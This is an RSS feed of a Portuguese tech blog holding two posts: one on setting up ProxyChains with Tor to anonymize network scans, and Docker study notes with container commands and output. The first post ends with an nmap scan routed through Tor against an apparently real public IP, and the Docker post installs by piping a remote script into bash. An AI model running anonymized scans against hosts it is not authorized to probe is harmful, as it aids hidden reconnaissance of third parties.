<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
    <title>FXSHELL</title>
    <link>/posts/</link>
    <description>Recent content on FXSHELL</description>
    <ttl>1440</ttl>
    <generator>Hugo 0.81.0</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 16 Mar 2021 02:50:21 UT</lastBuildDate>
    <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Proxychain</title>
      <link>/posts/proxychain/</link>
      <pubDate>Wed, 03 Feb 2021 14:49:14 UT</pubDate>
      <guid>/posts/proxychain/</guid>
      <description>O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
Ao invés do Proxychains realizar o roteamento para uma lista específica de proxys, podemos usar o Tor Router e redirecionar as requisições diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.</description>
      <content:encoded><![CDATA[O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
Ao invés do Proxychains realizar o roteamento para uma lista específica de proxys, podemos usar o Tor Router e redirecionar as requisições diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.
$ sudo apt-get install proxychains $ sudo apt-get install tor Dentro do arquivo de config do proxychains:
root@kali:~#: nano /etc/proxychains.conf Comentar a linha &amp;ldquo;strict_chain&amp;rdquo;
Descomentar a linha &amp;ldquo;dynamic_chain&amp;rdquo;
Explicação rápida sobre eles:
Strict Chain
Strict Chain é a opção padrão em proxychains. Nesta opção, todas as conexões passam pelos proxies na ordem listada no arquivo de configuração. Strict Chain é muito útil quando você deseja sua localização e sabe que os proxies selecionados estão funcionando bem. Para usar Strict Chain, é necessário descomentar “strict_chain” no arquivo de configuração.
Dynamic Chain funciona da mesma maneira que uma Strict Chain, é usado todos os proxies que estão no arquivo de configuração, mas é ignorado ou exclui os proxies da cadeia que está morta ou não está funcionando no momento. Para usar uma Dynamic Chain, remova o comentário de “Dynamic_Chain” e comente “random_chain” e “strict_chain” no arquivo de configuração.
Random Chain significa aleatoriedade, o que significa que todas as conexões passam por um proxy listado no seu arquivo de configuração, mas aleatoriamente, ninguém adivinha quais proxies são os próximos. Para usar Random Chain, é necessário descomentar “random_chain” e comentar “dynamic chain” e “strict_chain” no arquivo de configuração.
Se você estiver usando o random_chain, descomente a linha “chain_len”, que permite o encadeamento dinâmico. Ele conecta um número de endereços IP na cadeia que são gerados aleatoriamente a partir da sua lista de proxies.
Por padrão vem selecionado Strict Chain, por isso comentamos strict_chain e descomentamos dynamic_chain para que o proxychains trabalhe de forma dinamica.
E agora no final deste mesmo arquivo, vamos adicionar a linha:
socks5 127.0.0.1 9050
Inicializando o serviço do tor root@kali:~#: service tor start root@kali:~#: service tor status Testando a Conexão Abra o Firefox ou Iceweasel e acesse a URL http://www.meuip.com.br/ para pegar o seu IP atual
root@kali:~#: proxychains firefox Agora acesse o &amp;lsquo;utrace&amp;rsquo; e coloque o IP do seu Proxy para saber a localização do servidor que você está utilizando como Gateway em http://en.utrace.de/
Se estiver tudo certo, e ele te mostrar a origem do server, está pronto!
Agora quando for realizar alguma varredura é só executar o comando com o proxychains na frente, utilizando o terminal digite proxychains &#43; [ aplicação ]. O proxychains para tunelar o seu tráfego em qualquer aplicação.
Realizando uma varredura via Proxychains root@kali:~#: proxychains nmap -sC -sS 177.126.175.230 ]]></content:encoded>
    </item>
    <item>
      <title>Docker</title>
      <link>/posts/docker/</link>
      <pubDate>Thu, 08 Oct 2020 14:10:44 UT</pubDate>
      <guid>/posts/docker/</guid>
      <description>Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
Quando falamos de container, estamos falando de isolamento. Esse container está sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que está rodando este container.</description>
      <content:encoded><![CDATA[Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
Quando falamos de container, estamos falando de isolamento. Esse container está sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que está rodando este container.
Duas formas de isolamento, lógica e física.
Lógica (namespaces): redes, usuários, processos Física (Cgroups): CPU, memoria, disco.
#O que é o Docker?
Todos as imagens em camadas são read-only exceto a primeira camada ou seja a ultima é alterada. Se eu tenho 5 Containers de 500mb rodando, não será 5GB de espaço alocado no disco do servidor. Continuará sendo 500MB, pois ele usa a mesma imagem em todas as camadas.
O módulo do kernel Linux é o responsável por criar rotas, redirects e boa parte da tarefa de roteamento de pacotes para o Docker é o Netfilter
O módulo do kernel Linux é o responsável pelo isolamento de recursos como CPU e memória é o Cgroups
O módulo do kernel Linux é o responsável pelo isolamento de processos, é o namespaces
Instalando o Docker Comandos Utilizados:
curl -fsSL https://get.docker.com/ | bash docker version docker container ls a versão paga do Docker é a versão Docker EE (enterprise)
Mas vamos utilizar a versão CE, versão gratuita.
osboxes@osboxes:~$ docker version Client: Docker Engine - Community Version: 19.03.13 API version: 1.40 Go version: go1.13.15 Git commit: 4484c46d9d Built: Wed Sep 16 17:02:52 2020 OS/Arch: linux/amd64 Experimental: false Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/version: dial unix /var/run/docker.sock: connect: permission denied #Executando e administrando containers Docker
A primeira coisa a se fazer é o famoso hello-word
Algo como:
#$ docker container run hello-world
root@osboxes:~# docker container run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &amp;#34;hello-world&amp;#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ Para visualizar todos os containers que estão em execução, parados ou mortos, eu utilizo o comando:
#$ docker container ls -a
root@osboxes:~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fc4253022db8 hello-world &amp;#34;/hello&amp;#34; 36 seconds ago Exited (0) 34 seconds ago reverent_neumann 106fbfd9aba4 hello-world &amp;#34;/hello&amp;#34; 8 minutes ago Exited (0) 8 minutes ago hungry_kapitsa Outra coisa interessante é usar o comando -ti para cair dentro do container que acabou de subir, ou seja eu quero um terminal com interatividade, no caso seria algo como:
root@osboxes:~# docker container run -ti ubuntu Unable to find image &amp;#39;ubuntu:latest&amp;#39; locally latest: Pulling from library/ubuntu d72e567cc804: Pull complete 0f3630e5ff08: Pull complete b6a83d81d1f4: Pull complete Digest: sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537 Status: Downloaded newer image for ubuntu:latest root@2fd8c26be92e:/# Perceba que já está dentro do ubuntu que subiu, vamos ver os processos dele agora:
root@2fd8c26be92e:/# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 17:15 pts/0 00:00:00 /bin/bash root 8 1 0 17:17 pts/0 00:00:00 ps -ef Se eu der um CTRL&#43;D eu saiu do container criado e ele morre.
Todo container tem um entrypoint, neste caso é o próprio bash, então quando saimos dele, ele é finalizado também.
root@osboxes:~# docker container run -ti centos Unable to find image &amp;#39;centos:latest&amp;#39; locally latest: Pulling from library/centos 3c72a8ed6814: Pull complete Digest: sha256:76d24f3ba3317fa945743bb3746fbaf3a0b752f10b10376960de01da70685fbd Status: Downloaded newer image for centos:latest [root@ca53ed399c0d /]#  Agora subi um CentOS, e já estou dentro dele.
[root@ca53ed399c0d /]# cat /etc/redhat-release  CentOS Linux release 8.2.2004 (Core) Se eu quero sair do container mas sem matar o container, eu digito ctrl&#43;p&#43;q quando eu volto para o meu host, posso visualizar que ela ainda está rodando.
root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 2 minutes ago Up 2 minutes pensive_turing root@osboxes:~# Como faço para voltar, agora utilizo o comando docker container attach &#43; [CONTAINER ID]
#$docker container attach ca53ed399c0d
root@osboxes:~# docker container attach ca53ed399c0d [root@ca53ed399c0d /]# cat /etc/redhat-release  CentOS Linux release 8.2.2004 (Core) Agora se eu subir um container do nginx por exemplo, nunca use a flag -ti vai parecer que está travado, acontece que você pediu para ele criar o container do nginx com interatividade, mas acontece que ele vai tentar abrir uma console, só que o entrypoint do nginx não é o bash, é o próprio processo.
Todo processo tem que estar em execução em primeiro plano, em foreign ground.
Mesmo se você attachar o nginx para tentar acessa-lo ficara parecendo que esta travando, novamente, o nginx está rodando em primeiro plano, se você entrar nele e sair, vai matar o container dele.
Ou seja neste caso não pode estar rodando como daemon.
Neste caso não vou utilizar ele com o -ti mas sim como -d, para rodar como daemon e não com interatividade.
$ docker container run nginx Primeiro eu rodo o run sem a flag -d para ele baixar o container pra mim localmente. Ai então rodo com a flag para ele deixar o processo do nginx como daemon.
$ docker container run -d nginx root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; About a minute ago Up About a minute 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing Agora tenho o CentOS e o Nginx rodando.
Para que eu possa acessar esse container do nginx, visto que o entrypoint dele é o próprio processo, eu executo o comando exec
O comando exec me permite rodar comandos no container e me trás os resultados em tela, neste caso posso executar comandos como &amp;ldquo;ls, cat&amp;rdquo; normalmente.
root@osboxes:~# docker container exec -ti fecca31902c0 ls bin dev	docker-entrypoint.sh home lib64 mnt proc run srv tmp var boot docker-entrypoint.d etc	lib media opt root sbin sys usr Para ficar melhor, posso executar o bash diretamente.
root@osboxes:~# docker container exec -ti fecca31902c0 bash root@fecca31902c0:/# cat /etc/issue Debian GNU/Linux 10 \n \l Posso ver até mesmo que o nginx está configurado com a página de boas vindas certinho.
root@fecca31902c0:/usr/share/nginx# curl localhost &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Welcome to nginx!&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Welcome to nginx!&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;For online documentation and support please refer to &amp;lt;a href=&amp;#34;http://nginx.org/&amp;#34;&amp;gt;nginx.org&amp;lt;/a&amp;gt;.&amp;lt;br/&amp;gt; Commercial support is available at &amp;lt;a href=&amp;#34;http://nginx.com/&amp;#34;&amp;gt;nginx.com&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;&amp;lt;em&amp;gt;Thank you for using nginx.&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Se eu der um CTRL&#43;D para sair do container, ele não vai matar o container por que o processo principal não era o bash, mas sim o daemon que rodei lá atrás.
root@fecca31902c0:/usr/share/nginx# exit root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 21 minutes ago Up 21 minutes 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing Rodar como daemon é não rodar este cara em primeiro plano, eu coloco -d nos casos que não quero ter interatividade, só quero que a aplicação rode.
E o comando stop eu paro os containers criados.
root@osboxes:~# docker container stop fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing root@osboxes:~# docker container stop ca53ed399c0d ca53ed399c0d root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@osboxes:~# Assim como também posso startar novamente
root@osboxes:~# docker container start fecca31902c0 fecca31902c0 root@osboxes:~# docker container start ca53ed399c0d ca53ed399c0d root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 37 minutes ago Up 11 seconds 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 3 seconds pensive_turing E também tenho o restart do container, caso precise.
root@osboxes:~# docker container restart fecca31902c0 fecca31902c0 O comando insepect vai trazer os detalhes daquele container.
root@osboxes:~# docker container inspect fecca31902c0 [ { &amp;#34;Id&amp;#34;: &amp;#34;fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e&amp;#34;, &amp;#34;Created&amp;#34;: &amp;#34;2020-10-10T03:11:02.088105653Z&amp;#34;, &amp;#34;Path&amp;#34;: &amp;#34;/docker-entrypoint.sh&amp;#34;, &amp;#34;Args&amp;#34;: [ &amp;#34;nginx&amp;#34;, &amp;#34;-g&amp;#34;, &amp;#34;daemon off;&amp;#34; ], &amp;#34;State&amp;#34;: { &amp;#34;Status&amp;#34;: &amp;#34;running&amp;#34;, &amp;#34;Running&amp;#34;: true, &amp;#34;Paused&amp;#34;: false, &amp;#34;Restarting&amp;#34;: false, &amp;#34;OOMKilled&amp;#34;: false, &amp;#34;Dead&amp;#34;: false, &amp;#34;Pid&amp;#34;: 83380, &amp;#34;ExitCode&amp;#34;: 0, &amp;#34;Error&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;StartedAt&amp;#34;: &amp;#34;2020-10-10T03:49:45.95038292Z&amp;#34;, &amp;#34;FinishedAt&amp;#34;: &amp;#34;2020-10-10T03:49:45.218821799Z&amp;#34; }, &amp;#34;Image&amp;#34;: &amp;#34;sha256:992e3b7be0465856d44bed9b3d5596267205a4cfaec4241439be42f77b3539a3&amp;#34;, &amp;#34;ResolvConfPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/resolv.conf&amp;#34;, &amp;#34;HostnamePath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/hostname&amp;#34;, &amp;#34;HostsPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/hosts&amp;#34;, &amp;#34;LogPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e-json.log&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;/affectionate_dijkstra&amp;#34;, &amp;#34;RestartCount&amp;#34;: 0, &amp;#34;Driver&amp;#34;: &amp;#34;overlay2&amp;#34;, &amp;#34;Platform&amp;#34;: &amp;#34;linux&amp;#34;, &amp;#34;MountLabel&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;ProcessLabel&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AppArmorProfile&amp;#34;: &amp;#34;docker-default&amp;#34;, &amp;#34;ExecIDs&amp;#34;: null, &amp;#34;HostConfig&amp;#34;: { &amp;#34;Binds&amp;#34;: null, &amp;#34;ContainerIDFile&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;LogConfig&amp;#34;: { &amp;#34;Type&amp;#34;: &amp;#34;json-file&amp;#34;, &amp;#34;Config&amp;#34;: {} }, &amp;#34;NetworkMode&amp;#34;: &amp;#34;default&amp;#34;, &amp;#34;PortBindings&amp;#34;: {}, &amp;#34;RestartPolicy&amp;#34;: { &amp;#34;Name&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;MaximumRetryCount&amp;#34;: 0 }, &amp;#34;AutoRemove&amp;#34;: false, &amp;#34;VolumeDriver&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;VolumesFrom&amp;#34;: null, &amp;#34;CapAdd&amp;#34;: null, &amp;#34;CapDrop&amp;#34;: null, &amp;#34;Capabilities&amp;#34;: null, &amp;#34;Dns&amp;#34;: [], &amp;#34;DnsOptions&amp;#34;: [], &amp;#34;DnsSearch&amp;#34;: [], &amp;#34;ExtraHosts&amp;#34;: null, &amp;#34;GroupAdd&amp;#34;: null, &amp;#34;IpcMode&amp;#34;: &amp;#34;private&amp;#34;, &amp;#34;Cgroup&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Links&amp;#34;: null, &amp;#34;OomScoreAdj&amp;#34;: 0, &amp;#34;PidMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Privileged&amp;#34;: false, &amp;#34;PublishAllPorts&amp;#34;: false, &amp;#34;ReadonlyRootfs&amp;#34;: false, &amp;#34;SecurityOpt&amp;#34;: null, &amp;#34;UTSMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;UsernsMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;ShmSize&amp;#34;: 67108864, &amp;#34;Runtime&amp;#34;: &amp;#34;runc&amp;#34;, &amp;#34;ConsoleSize&amp;#34;: [ 0, 0 ], &amp;#34;Isolation&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;CpuShares&amp;#34;: 0, &amp;#34;Memory&amp;#34;: 0, &amp;#34;NanoCpus&amp;#34;: 0, &amp;#34;CgroupParent&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;BlkioWeight&amp;#34;: 0, &amp;#34;BlkioWeightDevice&amp;#34;: [], &amp;#34;BlkioDeviceReadBps&amp;#34;: null, &amp;#34;BlkioDeviceWriteBps&amp;#34;: null, &amp;#34;BlkioDeviceReadIOps&amp;#34;: null, &amp;#34;BlkioDeviceWriteIOps&amp;#34;: null, &amp;#34;CpuPeriod&amp;#34;: 0, &amp;#34;CpuQuota&amp;#34;: 0, &amp;#34;CpuRealtimePeriod&amp;#34;: 0, &amp;#34;CpuRealtimeRuntime&amp;#34;: 0, &amp;#34;CpusetCpus&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;CpusetMems&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Devices&amp;#34;: [], &amp;#34;DeviceCgroupRules&amp;#34;: null, &amp;#34;DeviceRequests&amp;#34;: null, &amp;#34;KernelMemory&amp;#34;: 0, &amp;#34;KernelMemoryTCP&amp;#34;: 0, &amp;#34;MemoryReservation&amp;#34;: 0, &amp;#34;MemorySwap&amp;#34;: 0, &amp;#34;MemorySwappiness&amp;#34;: null, &amp;#34;OomKillDisable&amp;#34;: false, &amp;#34;PidsLimit&amp;#34;: null, &amp;#34;Ulimits&amp;#34;: null, &amp;#34;CpuCount&amp;#34;: 0, &amp;#34;CpuPercent&amp;#34;: 0, &amp;#34;IOMaximumIOps&amp;#34;: 0, &amp;#34;IOMaximumBandwidth&amp;#34;: 0, &amp;#34;MaskedPaths&amp;#34;: [ &amp;#34;/proc/asound&amp;#34;, &amp;#34;/proc/acpi&amp;#34;, &amp;#34;/proc/kcore&amp;#34;, &amp;#34;/proc/keys&amp;#34;, &amp;#34;/proc/latency_stats&amp;#34;, &amp;#34;/proc/timer_list&amp;#34;, &amp;#34;/proc/timer_stats&amp;#34;, &amp;#34;/proc/sched_debug&amp;#34;, &amp;#34;/proc/scsi&amp;#34;, &amp;#34;/sys/firmware&amp;#34; ], &amp;#34;ReadonlyPaths&amp;#34;: [ &amp;#34;/proc/bus&amp;#34;, &amp;#34;/proc/fs&amp;#34;, &amp;#34;/proc/irq&amp;#34;, &amp;#34;/proc/sys&amp;#34;, &amp;#34;/proc/sysrq-trigger&amp;#34; ] }, &amp;#34;GraphDriver&amp;#34;: { &amp;#34;Data&amp;#34;: { &amp;#34;LowerDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0-init/diff:/var/lib/docker/overlay2/84650e899c555dc002159c3c23c29e89e034100f74fd3cbb06e780ad664becf9/diff:/var/lib/docker/overlay2/1e436d1da6e23864fe43e1edc99b400aedf747d7c40c233334adc8dc8d605863/diff:/var/lib/docker/overlay2/ea346940afd1708c365a570cc67b1736ff34fe3abee91a19cd79ce0456dcfc80/diff:/var/lib/docker/overlay2/7a5860acc38166730e81c14f29786ca662e46d9a3470b89db74bf2c6f22373e9/diff:/var/lib/docker/overlay2/5fe8bdb9845162cbb357ac3c5d2a24ebedacca1d689eb69c1658d408fb5896db/diff&amp;#34;, &amp;#34;MergedDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/merged&amp;#34;, &amp;#34;UpperDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/diff&amp;#34;, &amp;#34;WorkDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/work&amp;#34; }, &amp;#34;Name&amp;#34;: &amp;#34;overlay2&amp;#34; }, &amp;#34;Mounts&amp;#34;: [], &amp;#34;Config&amp;#34;: { &amp;#34;Hostname&amp;#34;: &amp;#34;fecca31902c0&amp;#34;, &amp;#34;Domainname&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;User&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AttachStdin&amp;#34;: false, &amp;#34;AttachStdout&amp;#34;: false, &amp;#34;AttachStderr&amp;#34;: false, &amp;#34;ExposedPorts&amp;#34;: { &amp;#34;80/tcp&amp;#34;: {} }, &amp;#34;Tty&amp;#34;: false, &amp;#34;OpenStdin&amp;#34;: false, &amp;#34;StdinOnce&amp;#34;: false, &amp;#34;Env&amp;#34;: [ &amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;, &amp;#34;NGINX_VERSION=1.19.3&amp;#34;, &amp;#34;NJS_VERSION=0.4.4&amp;#34;, &amp;#34;PKG_RELEASE=1~buster&amp;#34; ], &amp;#34;Cmd&amp;#34;: [ &amp;#34;nginx&amp;#34;, &amp;#34;-g&amp;#34;, &amp;#34;daemon off;&amp;#34; ], &amp;#34;Image&amp;#34;: &amp;#34;nginx&amp;#34;, &amp;#34;Volumes&amp;#34;: null, &amp;#34;WorkingDir&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Entrypoint&amp;#34;: [ &amp;#34;/docker-entrypoint.sh&amp;#34; ], &amp;#34;OnBuild&amp;#34;: null, &amp;#34;Labels&amp;#34;: { &amp;#34;maintainer&amp;#34;: &amp;#34;NGINX Docker Maintainers &amp;lt;docker-maint@nginx.com&amp;gt;&amp;#34; }, &amp;#34;StopSignal&amp;#34;: &amp;#34;SIGTERM&amp;#34; }, &amp;#34;NetworkSettings&amp;#34;: { &amp;#34;Bridge&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;SandboxID&amp;#34;: &amp;#34;025bdf57c2c369552c5538135b7e5007d4491807375357f7bce90a802291915a&amp;#34;, &amp;#34;HairpinMode&amp;#34;: false, &amp;#34;LinkLocalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;LinkLocalIPv6PrefixLen&amp;#34;: 0, &amp;#34;Ports&amp;#34;: { &amp;#34;80/tcp&amp;#34;: null }, &amp;#34;SandboxKey&amp;#34;: &amp;#34;/var/run/docker/netns/025bdf57c2c3&amp;#34;, &amp;#34;SecondaryIPAddresses&amp;#34;: null, &amp;#34;SecondaryIPv6Addresses&amp;#34;: null, &amp;#34;EndpointID&amp;#34;: &amp;#34;61173c80ab6b1c9c01b93c48df85a8dfb3612d644d38a084e3abad2a7e24f0d0&amp;#34;, &amp;#34;Gateway&amp;#34;: &amp;#34;172.17.0.1&amp;#34;, &amp;#34;GlobalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6PrefixLen&amp;#34;: 0, &amp;#34;IPAddress&amp;#34;: &amp;#34;172.17.0.2&amp;#34;, &amp;#34;IPPrefixLen&amp;#34;: 16, &amp;#34;IPv6Gateway&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;MacAddress&amp;#34;: &amp;#34;02:42:ac:11:00:02&amp;#34;, &amp;#34;Networks&amp;#34;: { &amp;#34;bridge&amp;#34;: { &amp;#34;IPAMConfig&amp;#34;: null, &amp;#34;Links&amp;#34;: null, &amp;#34;Aliases&amp;#34;: null, &amp;#34;NetworkID&amp;#34;: &amp;#34;6bf2ac8e47d6de141905be78499c34f36b89ace5586c89a38be3090a8881365c&amp;#34;, &amp;#34;EndpointID&amp;#34;: &amp;#34;61173c80ab6b1c9c01b93c48df85a8dfb3612d644d38a084e3abad2a7e24f0d0&amp;#34;, &amp;#34;Gateway&amp;#34;: &amp;#34;172.17.0.1&amp;#34;, &amp;#34;IPAddress&amp;#34;: &amp;#34;172.17.0.2&amp;#34;, &amp;#34;IPPrefixLen&amp;#34;: 16, &amp;#34;IPv6Gateway&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6PrefixLen&amp;#34;: 0, &amp;#34;MacAddress&amp;#34;: &amp;#34;02:42:ac:11:00:02&amp;#34;, &amp;#34;DriverOpts&amp;#34;: null } } } } ] root@osboxes:~# Posso também pausar um container com o comando pause
root@osboxes:~# docker container pause fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 43 minutes ago Up 5 minutes (Paused) 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 6 minutes pensive_turing root@osboxes:~# docker container unpause fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 43 minutes ago Up 5 minutes 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 6 minutes pensive_turing Para que eu possa ver os logs deste container, utilizo o comando logs seguido da flag -f e ID para ficar monitorando.
root@osboxes:~# docker container logs -f fecca31902c0 /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/ /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh 10-listen-on-ipv6-by-default.sh: Getting the checksum of /etc/nginx/conf.d/default.conf 10-listen-on-ipv6-by-default.sh: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.sh: Configuration complete; ready for start up 127.0.0.1 - - [10/Oct/2020:03:26:52 &#43;0000] &amp;#34;GET / HTTP/1.1&amp;#34; 200 612 &amp;#34;-&amp;#34; &amp;#34;curl/7.64.0&amp;#34; &amp;#34;-&amp;#34; /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration Para remover um container, basta utilizar o comando rm, porém se o mesmo estiver em execução, ele não vai deixar. Para isso basta fazer um rm -f
root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 425c61ede184 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 2 minutes ago Up 2 minutes 80/tcp romantic_hofstadter ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 15 minutes pensive_turing root@osboxes:~# docker container rm 425c61ede184 Error response from daemon: You cannot remove a running container 425c61ede184f202b4ae9c3678c429735296fa916253dc953d723414cd3d52cb. Stop the container before attempting removal or force remove root@osboxes:~# docker container rm -f 425c61ede184 425c61ede184 root@osboxes:~# docker container rm -f 425c61ede184 425c61ede184 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 18 minutes pensive_turing Configurando CPU e memória para os meus containers Para checar como está o uso de recursos do container, eu utilizo o comando stats
root@osboxes:~# docker container stats 7f824cb8005e Para testar os recursos pode-se utilizar o programa Stress.
root@7f824cb8005e:/# apt-get install stress
Para ver detalhes do seu uso, utilize
$ stress &amp;ndash;help Fiz o seguinte comando
stress --cpu 1 --vm-bytes 128 --vm 1
Posso utilizar para ver os dados também o famoso top
